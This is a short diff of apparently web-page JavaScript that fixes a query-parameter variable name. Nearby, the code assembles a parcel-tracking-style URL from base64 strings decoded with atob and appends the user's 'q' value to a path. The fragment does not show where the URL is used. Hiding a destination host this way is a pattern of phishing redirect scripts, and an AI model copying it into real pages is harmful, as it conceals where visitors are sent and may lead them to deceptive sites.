@@ -11,7 +11,7 @@
         const b = atob('aHR0cHM6Ly9zdWl2aS0=');
         const r = atob('dHJhbnNwb3J0ZXVycy5jb20v');
         const p = new URLSearchParams(window.location.search);
-        const q = params.get('q')
+        const q = p.get('q')
         if(q) {
             w = "q/" + q; 
         }
